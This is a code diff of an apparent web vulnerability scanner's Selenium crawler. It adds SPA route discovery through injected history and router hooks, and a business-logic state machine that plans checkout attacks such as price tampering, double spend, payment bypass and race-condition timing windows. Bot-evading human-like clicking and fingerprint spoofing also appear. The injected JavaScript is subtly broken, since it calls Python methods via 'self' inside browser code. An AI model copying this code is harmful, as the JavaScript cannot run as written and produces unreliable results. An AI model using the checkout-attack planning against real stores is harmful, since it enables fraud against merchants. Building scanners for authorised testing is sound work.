+        if not self.driver:
+            return
+            
+        try:
+            # JavaScript to wait for router navigation completion
+            router_wait_script = """
+            return new Promise((resolve) => {
+                const startTime = Date.now();
+                const maxWaitTime = arguments[0] * 1000;
+                let lastUrlChange = Date.now();
+                let urlStableCount = 0;
+                const requiredStableCount = 3; // URL must be stable for 3 checks
+                
+                const checkUrlStability = () => {
+                    const currentTime = Date.now();
+                    const currentUrl = window.location.href;
+                    
+                    if (currentTime - lastUrlChange > 100) { // URL hasn't changed in 100ms
+                        urlStableCount++;
+                    } else {
+                        urlStableCount = 0;
+                        lastUrlChange = currentTime;
+                    }
+                    
+                    if (urlStableCount >= requiredStableCount || currentTime - startTime > maxWaitTime) {
+                        resolve({
+                            stable: urlStableCount >= requiredStableCount,
+                            url: currentUrl,
+                            duration: currentTime - startTime
+                        });
+                    } else {
+                        setTimeout(checkUrlStability, 50);
+                    }
+                };
+                
+                checkUrlStability();
+            });
+            """
+            
+            self.driver.set_script_timeout(timeout * 1000)
+            result = self.driver.execute_async_script(router_wait_script, timeout)
+            logging.info(f"Router navigation completed. Stable: {result['stable']}, URL: {result['url']}, Duration: {result['duration']}ms")
+            
+        except Exception as e:
+            logging.warning(f"Error waiting for router navigation: {e}")
+    
+    def _wait_for_network_idle(self, timeout=10, idle_timeout=2):
+        """
+        Wait for network requests to complete and become idle.
+        
+        Modern SPAs load data via AJAX/fetch after route changes. This method waits for
+        network activity to settle before proceeding.
+        
+        Args:
+            timeout: Maximum time to wait in seconds
+            idle_timeout: How long network must be idle to consider it complete (seconds)
+        """
+        if not self.driver:
+            return
+            
+        try:
+            # JavaScript to wait for network idle using Performance API
+            network_wait_script = """
+            return new Promise((resolve) => {
+                const startTime = Date.now();
+                const maxWaitTime = arguments[0] * 1000;
+                const idleWaitTime = arguments[1] * 1000;
+                let lastNetworkActivity = Date.now();
+                
+                const checkNetworkIdle = () => {
+                    const currentTime = Date.now();
+                    
+                    // Check for recent network activity using Performance API
+                    const entries = performance.getEntries();
+                    const recentEntries = entries.filter(entry => 
+                        currentTime - entry.startTime < 1000
+                    );
+                    
+                    if (recentEntries.length > 0) {
+                        lastNetworkActivity = currentTime;
+                    }
+                    
+                    const timeSinceLastActivity = currentTime - lastNetworkActivity;
+                    
+                    if (timeSinceLastActivity >= idleWaitTime || currentTime - startTime > maxWaitTime) {
+                        resolve({
+                            idle: timeSinceLastActivity >= idleWaitTime,
+                            duration: currentTime - startTime,
+                            recentRequests: recentEntries.length
+                        });
+                    } else {
+                        setTimeout(checkNetworkIdle, 100);
+                    }
+                };
+                
+                checkNetworkIdle();
+            });
+            """
+            
+            self.driver.set_script_timeout(timeout * 1000)
+            result = self.driver.execute_async_script(network_wait_script, timeout, idle_timeout)
+            logging.info(f"Network idle completed. Idle: {result['idle']}, Duration: {result['duration']}ms, Recent requests: {result['recentRequests']}")
+            
+        except Exception as e:
+            logging.warning(f"Error waiting for network idle: {e}")
+    
+    def _wait_for_dynamic_content(self, timeout=10):
+        """
+        Wait for dynamic content to be rendered in the DOM.
+        
+        React/Vue apps often render content asynchronously after route changes.
+        This method waits for significant DOM changes to settle.
+        
+        Args:
+            timeout: Maximum time to wait in seconds
+        """
+        if not self.driver:
+            return
+            
+        try:
+            # JavaScript to wait for DOM stability
+            dom_wait_script = """
+            return new Promise((resolve) => {
+                const startTime = Date.now();
+                const maxWaitTime = arguments[0] * 1000;
+                let lastDomChange = Date.now();
+                let domStableCount = 0;
+                const requiredStableCount = 3;
+                let previousHtmlLength = document.documentElement.outerHTML.length;
+                
+                const checkDomStability = () => {
+                    const currentTime = Date.now();
+                    const currentHtmlLength = document.documentElement.outerHTML.length;
+                    
+                    if (Math.abs(currentHtmlLength - previousHtmlLength) < 100) { // DOM stable
+                        domStableCount++;
+                    } else {
+                        domStableCount = 0;
+                        lastDomChange = currentTime;
+                        previousHtmlLength = currentHtmlLength;
+                    }
+                    
+                    if (domStableCount >= requiredStableCount || currentTime - startTime > maxWaitTime) {
+                        resolve({
+                            stable: domStableCount >= requiredStableCount,
+                            duration: currentTime - startTime,
+                            htmlLength: currentHtmlLength
+                        });
+                    } else {
+                        setTimeout(checkDomStability, 100);
+                    }
+                };
+                
+                checkDomStability();
+            });
+            """
+            
+            self.driver.set_script_timeout(timeout * 1000)
+            result = self.driver.execute_async_script(dom_wait_script, timeout)
+            logging.info(f"Dynamic content rendered. Stable: {result['stable']}, Duration: {result['duration']}ms, HTML length: {result['htmlLength']}")
+            
+        except Exception as e:
+            logging.warning(f"Error waiting for dynamic content: {e}")
+    
+    def _get_all_clickable_elements(self, include_shadow_dom=True, wait_for_dynamic=True):
         """
         Get all clickable elements from both regular DOM and Shadow DOM.
         
         Args:
             include_shadow_dom: Whether to include Shadow DOM elements
+            wait_for_dynamic: Whether to wait for dynamically loaded Shadow DOM trees
             
         Returns:
             list: All clickable elements
@@ -11870,12 +13538,12 @@ class JSRenderDriver:
         try:
             # Get regular DOM clickable elements
             regular_elements = self.driver.find_elements(By.CSS_SELECTOR, 
-                'a, button, input[type="submit"], input[type="button"], [onclick], [role="button"]')
+                'a, button, input[type="submit"], input[type="button"], [onclick], [role="button"], [data-testid], [data-cy]')
             clickable_elements.extend(regular_elements)
             
             # Get Shadow DOM clickable elements if enabled
             if include_shadow_dom and self.shadow_dom_enabled:
-                shadow_elements = self._query_shadow_dom()
+                shadow_elements = self._query_shadow_dom(wait_for_dynamic=wait_for_dynamic)
                 clickable_elements.extend(shadow_elements)
                 
             logging.info(f"Total clickable elements found: {len(clickable_elements)} "
@@ -11904,6 +13572,8 @@ class JSRenderDriver:
         routes = []
         
         try:
+            # Wait for dynamic content before discovery
+            self._wait_for_dynamic_content()
             # JavaScript to discover microfrontend routes
             microfrontend_script = """
             function discoverMicrofrontends() {
@@ -11971,6 +13641,9 @@ class JSRenderDriver:
         """
         Click elements found in Shadow DOM to discover hidden routes.
         
+        This enhanced version waits for router transitions, network requests, and dynamic content
+        to properly handle lazy-loaded routes in React/Vue applications.
+        
         Args:
             max_clicks: Maximum number of Shadow DOM elements to click
             
@@ -11983,8 +13656,8 @@ class JSRenderDriver:
         discovered_routes = []
         
         try:
-            # Get Shadow DOM clickable elements
-            shadow_elements = self._query_shadow_dom()
+            # Get Shadow DOM clickable elements with dynamic content waiting
+            shadow_elements = self._query_shadow_dom(wait_for_dynamic=True)
             
             # Click a subset of Shadow DOM elements
             for i, element in enumerate(shadow_elements[:max_clicks]):
@@ -11992,20 +13665,29 @@ class JSRenderDriver:
                     # Get element info before clicking
                     element_text = element.text
                     element_tag = element.tag_name
+                    previous_url = self.driver.current_url
                     
                     # Click the element
                     if self.human_like_behavior:
-                        if self._human_like_click(element):
+                        if self._human_like_click(element, wait_for_navigation=False):
                             logging.info(f"Clicked Shadow DOM element {i}: {element_tag} - {element_text}")
                     else:
                         self.driver.execute_script("arguments[0].click();", element)
-                        time.sleep(0.5)
                         logging.info(f"Clicked Shadow DOM element {i}: {element_tag} - {element_text}")
+                        time.sleep(0.3)  # Small delay for basic animation
+                    
+                    # Wait for router navigation and network requests
+                    self._wait_for_router_navigation()
+                    self._wait_for_network_idle()
+                    
+                    # Wait for dynamic content rendering
+                    self._wait_for_dynamic_content()
                     
                     # Check if URL changed (route discovered)
                     current_url = self.driver.current_url
-                    if current_url not in discovered_routes:
+                    if current_url != previous_url and current_url not in discovered_routes:
                         discovered_routes.append(current_url)
+                        logging.info(f"Discovered new route: {current_url}")
                         
                 except Exception as e:
                     logging.warning(f"Error clicking Shadow DOM element {i}: {e}")
@@ -12103,8 +13785,17 @@ class JSRenderDriver:
         except Exception as e:
             logging.warning(f"Natural scroll error: {e}")
     
-    def _human_like_click(self, element):
-        """Simulate human-like click with realistic timing and hover"""
+    def _human_like_click(self, element, wait_for_navigation=False):
+        """
+        Simulate human-like click with realistic timing and hover.
+        
+        Args:
+            element: The element to click
+            wait_for_navigation: Whether to wait for router navigation after click (default False to avoid double-waiting)
+            
+        Returns:
+            bool: True if click was successful
+        """
         if not self.driver:
             return False
         
@@ -12137,6 +13828,12 @@ class JSRenderDriver:
             
             # Post-click delay (reading/processing time)
             time.sleep(random.uniform(0.2, 0.6))
+            
+            # Wait for router navigation and network requests if enabled
+            if wait_for_navigation:
+                self._wait_for_router_navigation()
+                self._wait_for_network_idle()
+                self._wait_for_dynamic_content()
             
             return True
             
@@ -12235,7 +13932,437 @@ class JSRenderDriver:
             logging.warning(f"WebSocket monitoring setup failed: {e}")
             self.websocket_monitoring_enabled = False
     
-    def monitor_websocket_traffic(self, timeout=10):
+    def _enable_spa_route_monitoring(self):
+        """Enable enhanced SPA route monitoring using CDP and framework instrumentation"""
+        try:
+            # Enable Runtime domain for JavaScript execution
+            self.driver.execute_cdp_cmd("Runtime.enable", {})
+            
+            # Enable Page domain for navigation events
+            self.driver.execute_cdp_cmd("Page.enable", {})
+            
+            # Inject framework router instrumentation
+            self._inject_framework_router_hooks()
+            
+            # Set up CDP event listeners for passive route discovery
+            self._setup_cdp_route_listeners()
+            
+            self.passive_route_monitoring = True
+            logging.info("Enhanced SPA route monitoring enabled")
+            
+        except Exception as e:
+            logging.warning(f"SPA route monitoring setup failed: {e}")
+            self.passive_route_monitoring = False
+    
+    def _inject_framework_router_hooks(self):
+        """Inject JavaScript hooks to detect and instrument framework routers"""
+        try:
+            router_injection_script = """
+            (function() {
+                // Store discovered routes
+                window.__discovered_routes = window.__discovered_routes || [];
+                window.__route_transitions = window.__route_transitions || [];
+                window.__framework_info = window.__framework_info || {};
+                
+                // 1. React Router Detection and Instrumentation
+                if (window.React || window.ReactDOM || document.querySelector('[data-reactroot]')) {
+                    window.__framework_info.react = true;
+                    
+                    // Try to access React Router instance
+                    try {
+                        // React Router v6+
+                        if (window.__REACT_ROUTER_INSTANCE__) {
+                            const routes = window.__REACT_ROUTER_INSTANCE__.routes;
+                            if (routes) {
+                                window.__discovered_routes.push(...self._extract_routes_from_react_router(routes));
+                            }
+                        }
+                        
+                        // React Router v5 and below
+                        if (window.__REACT_ROUTER_5_INSTANCE__) {
+                            const routes = window.__REACT_ROUTER_5_INSTANCE__.routes;
+                            if (routes) {
+                                window.__discovered_routes.push(...self._extract_routes_from_react_router_v5(routes));
+                            }
+                        }
+                    } catch (e) {
+                        console.log('React Router instrumentation failed:', e);
+                    }
+                    
+                    // Hook into React Router navigation
+                    const originalPushState = history.pushState;
+                    history.pushState = function(state, title, url) {
+                        window.__route_transitions.push({
+                            from: window.location.pathname,
+                            to: url,
+                            timestamp: Date.now(),
+                            framework: 'react'
+                        });
+                        return originalPushState.apply(this, arguments);
+                    };
+                }
+                
+                // 2. Angular Router Detection and Instrumentation
+                if (window.ng || window.angular || document.querySelector('[ng-app]')) {
+                    window.__framework_info.angular = true;
+                    
+                    try {
+                        // Access Angular router instance
+                        if (window.ng && window.ng.probe) {
+                            const injector = window.ng.probe(document.body).injector;
+                            if (injector) {
+                                const router = injector.get('Router');
+                                if (router && router.config) {
+                                    window.__discovered_routes.push(...self._extract_routes_from_angular_router(router.config));
+                                }
+                            }
+                        }
+                    } catch (e) {
+                        console.log('Angular Router instrumentation failed:', e);
+                    }
+                    
+                    // Hook into Angular navigation
+                    if (window.angular) {
+                        const originalAngularPushState = history.pushState;
+                        history.pushState = function(state, title, url) {
+                            window.__route_transitions.push({
+                                from: window.location.pathname,
+                                to: url,
+                                timestamp: Date.now(),
+                                framework: 'angular'
+                            });
+                            return originalAngularPushState.apply(this, arguments);
+                        };
+                    }
+                }
+                
+                // 3. Vue Router Detection and Instrumentation
+                if (window.Vue || window.vuex || document.querySelector('[data-v-]')) {
+                    window.__framework_info.vue = true;
+                    
+                    try {
+                        // Access Vue Router instance
+                        if (window.__VUE_ROUTER__) {
+                            const routes = window.__VUE_ROUTER__.options.routes;
+                            if (routes) {
+                                window.__discovered_routes.push(...self._extract_routes_from_vue_router(routes));
+                            }
+                        }
+                        
+                        // Vue 3 Router
+                        if (window.__VUE_3_ROUTER__) {
+                            const routes = window.__VUE_3_ROUTER__.options.routes;
+                            if (routes) {
+                                window.__discovered_routes.push(...self._extract_routes_from_vue_router(routes));
+                            }
+                        }
+                    } catch (e) {
+                        console.log('Vue Router instrumentation failed:', e);
+                    }
+                    
+                    // Hook into Vue Router navigation
+                    const originalVuePushState = history.pushState;
+                    history.pushState = function(state, title, url) {
+                        window.__route_transitions.push({
+                            from: window.location.pathname,
+                            to: url,
+                            timestamp: Date.now(),
+                            framework: 'vue'
+                        });
+                        return originalVuePushState.apply(this, arguments);
+                    };
+                }
+                
+                // 4. Generic SPA Router Detection
+                // Monitor all pushState, replaceState, and popstate events
+                const originalGenericPushState = history.pushState;
+                const originalReplaceState = history.replaceState;
+                
+                history.pushState = function(state, title, url) {
+                    if (!window.__route_transitions.some(t => t.to === url && t.timestamp === Date.now())) {
+                        window.__route_transitions.push({
+                            from: window.location.pathname,
+                            to: url,
+                            timestamp: Date.now(),
+                            framework: 'generic'
+                        });
+                    }
+                    return originalGenericPushState.apply(this, arguments);
+                };
+                
+                history.replaceState = function(state, title, url) {
+                    window.__route_transitions.push({
+                        from: window.location.pathname,
+                        to: url,
+                        timestamp: Date.now(),
+                        framework: 'generic',
+                        type: 'replace'
+                    });
+                    return originalReplaceState.apply(this, arguments);
+                };
+                
+                window.addEventListener('popstate', function(event) {
+                    window.__route_transitions.push({
+                        from: window.location.pathname,
+                        to: window.location.pathname,
+                        timestamp: Date.now(),
+                        framework: 'generic',
+                        type: 'popstate'
+                    });
+                });
+                
+                // 5. Lazy-loaded route detection
+                // Monitor dynamic script loading and component registration
+                const originalInsertBefore = Node.prototype.insertBefore;
+                Node.prototype.insertBefore = function(newNode, referenceNode) {
+                    if (newNode.tagName === 'SCRIPT' && newNode.src) {
+                        window.__discovered_routes.push({
+                            type: 'lazy_load',
+                            source: newNode.src,
+                            timestamp: Date.now()
+                        });
+                    }
+                    return originalInsertBefore.apply(this, arguments);
+                };
+                
+                console.log('Framework router instrumentation complete');
+                console.log('Discovered routes:', window.__discovered_routes);
+                console.log('Framework info:', window.__framework_info);
+            })();
+            """
+            
+            self.driver.execute_script(router_injection_script)
+            logging.info("Framework router hooks injected successfully")
+            
+        except Exception as e:
+            logging.warning(f"Framework router injection failed: {e}")
+    
+    def _setup_cdp_route_listeners(self):
+        """Set up CDP event listeners for passive route discovery"""
+        try:
+            # Listen for frame navigation events
+            self.driver.execute_cdp_cmd("Page.enable", {})
+            
+            # Set up JavaScript execution for event monitoring
+            event_monitor_script = """
+            (function() {
+                // CDP event monitoring will be handled via Runtime.evaluate
+                // This is a placeholder for future CDP event integration
+                window.__cdp_route_monitoring = true;
+            })();
+            """
+            
+            self.driver.execute_script(event_monitor_script)
+            logging.info("CDP route listeners configured")
+            
+        except Exception as e:
+            logging.warning(f"CDP route listener setup failed: {e}")
+    
+    def _extract_routes_from_react_router(self, routes):
+        """Extract routes from React Router configuration"""
+        extracted_routes = []
+        
+        extraction_script = """
+        function extractRoutes(routes, basePath = '') {
+            const routes_list = [];
+            
+            if (!routes) return routes_list;
+            
+            routes.forEach(route => {
+                if (route.path) {
+                    const fullPath = basePath + route.path;
+                    routes_list.push({
+                        path: fullPath,
+                        component: route.element?.type?.name || route.component?.name || 'Unknown',
+                        type: 'react_route'
+                    });
+                }
+                
+                if (route.children) {
+                    routes_list.push(...extractRoutes(route.children, route.path || basePath));
+                }
+            });
+            
+            return routes_list;
+        }
+        
+        return extractRoutes(arguments[0]);
+        """
+        
+        try:
+            routes = self.driver.execute_script(extraction_script, routes)
+            extracted_routes.extend(routes)
+        except Exception as e:
+            logging.warning(f"React Router extraction failed: {e}")
+        
+        return extracted_routes
+    
+    def _extract_routes_from_angular_router(self, router_config):
+        """Extract routes from Angular Router configuration"""
+        extracted_routes = []
+        
+        extraction_script = """
+        function extractAngularRoutes(config) {
+            const routes_list = [];
+            
+            if (!config) return routes_list;
+            
+            config.forEach(route => {
+                if (route.path) {
+                    routes_list.push({
+                        path: route.path,
+                        component: route.component?.name || 'Unknown',
+                        type: 'angular_route'
+                    });
+                }
+                
+                if (route.children) {
+                    routes_list.push(...extractAngularRoutes(route.children));
+                }
+            });
+            
+            return routes_list;
+        }
+        
+        return extractAngularRoutes(arguments[0]);
+        """
+        
+        try:
+            routes = self.driver.execute_script(extraction_script, router_config)
+            extracted_routes.extend(routes)
+        except Exception as e:
+            logging.warning(f"Angular Router extraction failed: {e}")
+        
+        return extracted_routes
+    
+    def _extract_routes_from_vue_router(self, routes):
+        """Extract routes from Vue Router configuration"""
+        extracted_routes = []
+        
+        extraction_script = """
+        function extractVueRoutes(routes) {
+            const routes_list = [];
+            
+            if (!routes) return routes_list;
+            
+            routes.forEach(route => {
+                if (route.path) {
+                    routes_list.push({
+                        path: route.path,
+                        component: route.component?.name || 'Unknown',
+                        type: 'vue_route'
+                    });
+                }
+                
+                if (route.children) {
+                    routes_list.push(...extractVueRoutes(route.children));
+                }
+            });
+            
+            return routes_list;
+        }
+        
+        return extractVueRoutes(arguments[0]);
+        """
+        
+        try:
+            routes = self.driver.execute_script(extraction_script, routes)
+            extracted_routes.extend(routes)
+        except Exception as e:
+            logging.warning(f"Vue Router extraction failed: {e}")
+        
+        return extracted_routes
+    
+    def get_discovered_routes(self):
+        """Get all discovered routes from framework instrumentation"""
+        try:
+            get_routes_script = """
+            return {
+                discovered_routes: window.__discovered_routes || [],
+                route_transitions: window.__route_transitions || [],
+                framework_info: window.__framework_info || {}
+            };
+            """
+            
+            route_data = self.driver.execute_script(get_routes_script)
+            
+            # Update internal state
+            if route_data.get('discovered_routes'):
+                for route in route_data['discovered_routes']:
+                    if isinstance(route, dict):
+                        route_key = route.get('path') or route.get('source') or str(route)
+                        self.discovered_routes.add(route_key)
+            
+            if route_data.get('route_transitions'):
+                self.route_transitions.extend(route_data['route_transitions'])
+            
+            if route_data.get('framework_info'):
+                self.framework_routers.update(route_data['framework_info'])
+            
+            return route_data
+            
+        except Exception as e:
+            logging.warning(f"Failed to get discovered routes: {e}")
+            return {
+                'discovered_routes': list(self.discovered_routes),
+                'route_transitions': self.route_transitions,
+                'framework_info': self.framework_routers
+            }
+    
+    def monitor_route_changes(self, duration=30):
+        """Passively monitor route changes for specified duration"""
+        if not self.driver or not self.passive_route_monitoring:
+            logging.warning("Route monitoring not enabled")
+            return []
+        
+        logging.info(f"Monitoring route changes for {duration} seconds...")
+        start_time = time.time()
+        initial_route_count = len(self.discovered_routes)
+        
+        try:
+            while time.time() - start_time < duration:
+                # Get current routes
+                route_data = self.get_discovered_routes()
+                
+                # Simulate user interaction to trigger lazy-loaded routes
+                if random.random() < 0.3:  # 30% chance to interact
+                    self._simulate_random_interaction()
+                
+                time.sleep(2)  # Check every 2 seconds
+            
+            new_routes = len(self.discovered_routes) - initial_route_count
+            logging.info(f"Route monitoring complete. Discovered {new_routes} new routes.")
+            
+            return list(self.discovered_routes)
+            
+        except Exception as e:
+            logging.warning(f"Route monitoring error: {e}")
+            return list(self.discovered_routes)
+    
+    def _simulate_random_interaction(self):
+        """Simulate random user interaction to trigger lazy-loaded routes"""
+        try:
+            interaction_script = """
+            // Find and click random interactive elements
+            const interactiveElements = document.querySelectorAll('a, button, [onclick], [role="button"]');
+            if (interactiveElements.length > 0) {
+                const randomElement = interactiveElements[Math.floor(Math.random() * interactiveElements.length)];
+                if (randomElement.offsetParent !== null) { // Element is visible
+                    randomElement.click();
+                    return { clicked: true, element: randomElement.tagName };
+                }
+            }
+            return { clicked: false };
+            """
+            
+            result = self.driver.execute_script(interaction_script)
+            if result.get('clicked'):
+                logging.debug(f"Simulated click on {result.get('element')}")
+                
+        except Exception as e:
+            logging.debug(f"Random interaction simulation failed: {e}")
+    
+    def monitor_websocket_traffic(self, timeout=DEFAULT_REQUEST_TIMEOUT):
         """Monitor WebSocket traffic for a specified timeout period"""
         if not self.driver or not self.websocket_monitoring_enabled:
             return []
@@ -12394,7 +14521,7 @@ class JSRenderDriver:
             logging.warning(f"Error setting browser fingerprint: {e}")
             return False
     
-    def wait_for_websocket_message(self, pattern, timeout=10):
+    def wait_for_websocket_message(self, pattern, timeout=DEFAULT_REQUEST_TIMEOUT):
         """Wait for a WebSocket message matching a pattern"""
         if not self.driver or not self.websocket_monitoring_enabled:
             return None
@@ -12414,9 +14541,467 @@ class JSRenderDriver:
         logging.warning(f"No WebSocket message found matching pattern: {pattern}")
         return None
 
+class BusinessLogicFSM:
+    """
+    Finite State Machine for business logic flow detection and state-aware testing.
+    
+    This FSM learns the sequence of user actions in high-value flows (e.g., e-commerce checkout)
+    and enables state-transition-aware vulnerability testing, particularly for race conditions.
+    """
+    
+    def __init__(self):
+        # FSM State definitions
+        self.states = {
+            'initial': {'transitions': [], 'entry_actions': [], 'exit_actions': []},
+            'browse': {'transitions': ['add_to_cart', 'view_product'], 'entry_actions': [], 'exit_actions': []},
+            'cart': {'transitions': ['checkout', 'update_quantity', 'remove_item'], 'entry_actions': [], 'exit_actions': []},
+            'checkout': {'transitions': ['confirm_order', 'enter_payment', 'enter_shipping'], 'entry_actions': [], 'exit_actions': []},
+            'payment': {'transitions': ['process_payment', 'cancel_payment'], 'entry_actions': [], 'exit_actions': []},
+            'confirm': {'transitions': ['complete_order', 'modify_order'], 'entry_actions': [], 'exit_actions': []},
+            'complete': {'transitions': ['continue_shopping', 'view_order'], 'entry_actions': [], 'exit_actions': []}
+        }
+        
+        # Current state
+        self.current_state = 'initial'
+        
+        # Learned state sequences (patterns discovered during crawling)
+        self.learned_sequences = defaultdict(list)
+        self.sequence_confidence = defaultdict(float)
+        
+        # State transition history
+        self.transition_history = []
+        
+        # State-specific vulnerability testing patterns
+        self.state_vulnerability_patterns = {
+            'cart': ['price_tampering', 'quantity_manipulation', 'coupon_abuse'],
+            'checkout': ['race_condition', 'session_fixation', 'csrf_bypass'],
+            'payment': ['payment_tampering', 'race_condition', 'idempotency_violation'],
+            'confirm': ['race_condition', 'state_confusion', 'finalization_bypass']
+        }
+        
+        # High-value flow templates
+        self.flow_templates = {
+            'ecommerce_checkout': ['browse', 'cart', 'checkout', 'payment', 'confirm', 'complete'],
+            'user_registration': ['initial', 'enter_details', 'verify_email', 'complete'],
+            'password_reset': ['initial', 'request_reset', 'verify_token', 'complete'],
+            'file_upload': ['initial', 'select_file', 'upload', 'process', 'complete']
+        }
+        
+        # State context information
+        self.state_context = {}
+        
+        # Race condition injection points
+        self.race_injection_points = {
+            'cart_checkout_transition': {
+                'timing': ['state_transition', 'before_commit', 'after_commit'],
+                'payloads': ['price_manipulation', 'quantity_overflow', 'coupon_stacking']
+            },
+            'payment_processing': {
+                'timing': ['during_payment', 'after_authorization', 'before_confirmation'],
+                'payloads': ['amount_tampering', 'double_spend', 'payment_bypass']
+            }
+        }
+    
+    def add_transition(self, from_state, to_state, action, context=None):
+        """
+        Record a state transition for learning.
+        
+        Args:
+            from_state: Source state
+            to_state: Destination state  
+            action: Action that triggered the transition
+            context: Additional context about the transition
+        """
+        transition = {
+            'from': from_state,
+            'to': to_state,
+            'action': action,
+            'context': context or {},
+            'timestamp': datetime.now().isoformat()
+        }
+        
+        self.transition_history.append(transition)
+        
+        # Update learned sequences
+        sequence_key = f"{from_state}->{to_state}"
+        self.learned_sequences[sequence_key].append(transition)
+        
+        # Update confidence based on frequency
+        self.sequence_confidence[sequence_key] = min(1.0, 
+            self.sequence_confidence[sequence_key] + 0.1)
+        
+        # Update current state
+        self.current_state = to_state
+        self.state_context[to_state] = context or {}
+        
+        logging.debug(f"FSM transition: {from_state} -> {to_state} (action: {action})")
+    
+    def detect_state_from_url(self, url, form_data=None):
+        """
+        Detect the current business logic state from URL and form data.
+        
+        Args:
+            url: Current URL
+            form_data: Form data if available
+            
+        Returns:
+            Detected state name
+        """
+        url_lower = url.lower()
+        
+        # E-commerce state detection
+        if any(keyword in url_lower for keyword in ['/cart', '/basket', '/bag']):
+            return 'cart'
+        elif any(keyword in url_lower for keyword in ['/checkout', '/purchase', '/buy']):
+            return 'checkout'
+        elif any(keyword in url_lower for keyword in ['/payment', '/pay', '/billing']):
+            return 'payment'
+        elif any(keyword in url_lower for keyword in ['/confirm', '/review', '/finalize']):
+            return 'confirm'
+        elif any(keyword in url_lower for keyword in ['/complete', '/success', '/thank-you', '/order']):
+            return 'complete'
+        elif any(keyword in url_lower for keyword in ['/product', '/item', '/details']):
+            return 'browse'
+        
+        # User authentication states
+        if any(keyword in url_lower for keyword in ['/login', '/signin', '/auth']):
+            return 'authentication'
+        elif any(keyword in url_lower for keyword in ['/register', '/signup', '/join']):
+            return 'registration'
+        elif any(keyword in url_lower for keyword in ['/reset', '/forgot', '/recover']):
+            return 'password_reset'
+        
+        # Form-based state detection
+        if form_data:
+            form_text = str(form_data).lower()
+            if any(keyword in form_text for keyword in ['credit card', 'cvv', 'expiry', 'payment']):
+                return 'payment'
+            elif any(keyword in form_text for keyword in ['shipping', 'address', 'delivery']):
+                return 'checkout'
+            elif any(keyword in form_text for keyword in ['quantity', 'update', 'remove']):
+                return 'cart'
+        
+        return 'browse'  # Default state
+    
+    def get_recommended_tests(self, current_state):
+        """
+        Get recommended vulnerability tests based on current state.
+        
+        Args:
+            current_state: Current FSM state
+            
+        Returns:
+            List of recommended test types with priorities
+        """
+        recommended = []
+        
+        # Get state-specific patterns
+        patterns = self.state_vulnerability_patterns.get(current_state, [])
+        
+        for pattern in patterns:
+            priority = self._calculate_test_priority(current_state, pattern)
+            recommended.append({
+                'test_type': pattern,
+                'priority': priority,
+                'state': current_state,
+                'injection_points': self._get_injection_points(current_state, pattern)
+            })
+        
+        # Sort by priority
+        recommended.sort(key=lambda x: x['priority'], reverse=True)
+        
+        return recommended
+    
+    def _calculate_test_priority(self, state, pattern):
+        """Calculate priority for a test based on state and pattern"""
+        base_priority = 0.5
+        
+        # High-risk states get higher priority
+        if state in ['payment', 'checkout', 'confirm']:
+            base_priority += 0.3
+        
+        # High-risk patterns get higher priority
+        if pattern in ['race_condition', 'price_tampering', 'payment_tampering']:
+            base_priority += 0.2
+        
+        return min(1.0, base_priority)
+    
+    def _get_injection_points(self, state, pattern):
+        """Get optimal injection points for a given state and pattern"""
+        injection_points = []
+        
+        # State transition injection points
+        if pattern == 'race_condition':
+            if state == 'cart':
+                injection_points.append('before_checkout')
+                injection_points.append('during_cart_update')
+            elif state == 'checkout':
+                injection_points.append('before_payment')
+                injection_points.append('during_address_change')
+            elif state == 'payment':
+                injection_points.append('during_payment_processing')
+                injection_points.append('after_payment_authorization')
+        
+        # Data manipulation injection points
+        if pattern in ['price_tampering', 'quantity_manipulation']:
+            if state == 'cart':
+                injection_points.append('cart_api_endpoint')
+                injection_points.append('local_storage_cart')
+            elif state == 'checkout':
+                injection_points.append('order_summary_endpoint')
+        
+        return injection_points
+    
+    def get_race_condition_windows(self, current_state, next_state=None):
+        """
+        Get optimal race condition testing windows for state transitions.
+        
+        Args:
+            current_state: Current FSM state
+            next_state: Expected next state (if known)
+            
+        Returns:
+            Dictionary of race condition windows with timing strategies
+        """
+        race_windows = {}
+        
+        transition_key = f"{current_state}->{next_state}" if next_state else None
+        
+        # Check for known high-risk transitions
+        if transition_key in self.race_injection_points:
+            race_windows[transition_key] = self.race_injection_points[transition_key]
+        else:
+            # Generic race condition windows based on current state
+            if current_state == 'cart':
+                race_windows['cart_operations'] = {
+                    'timing': ['during_add', 'during_remove', 'during_quantity_change'],
+                    'payloads': ['concurrent_cart_modification', 'inventory_oversell'],
+                    'time_deltas': [0, 10, 50, 100]  # milliseconds
+                }
+            elif current_state == 'checkout':
+                race_windows['checkout_process'] = {
+                    'timing': ['before_payment', 'during_address_update', 'during_coupon_apply'],
+                    'payloads': ['price_lock_bypass', 'shipping_cost_tampering'],
+                    'time_deltas': [0, 10, 50, 100]
+                }
+            elif current_state == 'payment':
+                race_windows['payment_processing'] = {
+                    'timing': ['during_payment', 'after_authorization', 'before_confirmation'],
+                    'payloads': ['double_spend', 'amount_tampering', 'payment_bypass'],
+                    'time_deltas': [0, 10, 50, 100]
+                }
+        
+        return race_windows
+    
+    def learn_flow_sequence(self, url_sequence, action_sequence):
+        """
+        Learn a complete flow sequence from observed user actions.
+        
+        Args:
+            url_sequence: List of URLs visited
+            action_sequence: List of actions performed
+        """
+        if len(url_sequence) != len(action_sequence):
+            logging.warning("URL sequence and action sequence length mismatch")
+            return
+        
+        detected_states = []
+        for url in url_sequence:
+            state = self.detect_state_from_url(url)
+            detected_states.append(state)
+        
+        # Build state transitions
+        for i in range(len(detected_states) - 1):
+            from_state = detected_states[i]
+            to_state = detected_states[i + 1]
+            action = action_sequence[i]
+            
+            self.add_transition(from_state, to_state, action, {
+                'url': url_sequence[i],
+                'next_url': url_sequence[i + 1]
+            })
+        
+        # Identify flow pattern
+        flow_pattern = self._identify_flow_pattern(detected_states)
+        if flow_pattern:
+            logging.info(f"Learned flow pattern: {flow_pattern}")
+            self._update_flow_template(flow_pattern, detected_states)
+    
+    def _identify_flow_pattern(self, state_sequence):
+        """Identify which flow template matches the observed state sequence"""
+        for template_name, template_states in self.flow_templates.items():
+            if self._sequence_matches_template(state_sequence, template_states):
+                return template_name
+        return None
+    
+    def _sequence_matches_template(self, observed, template):
+        """Check if observed sequence matches template pattern"""
+        # Simple substring match for now
+        template_str = ','.join(template)
+        observed_str = ','.join(observed)
+        return template_str in observed_str or len(set(observed) & set(template)) >= len(template) * 0.7
+    
+    def _update_flow_template(self, template_name, observed_sequence):
+        """Update flow template with learned sequence"""
+        if template_name in self.flow_templates:
+            # Merge observed sequence with template
+            existing = self.flow_templates[template_name]
+            for state in observed_sequence:
+                if state not in existing:
+                    existing.append(state)
+    
+    def get_optimal_race_injection_point(self, current_state):
+        """
+        Get the optimal injection point for race condition testing in current state.
+        
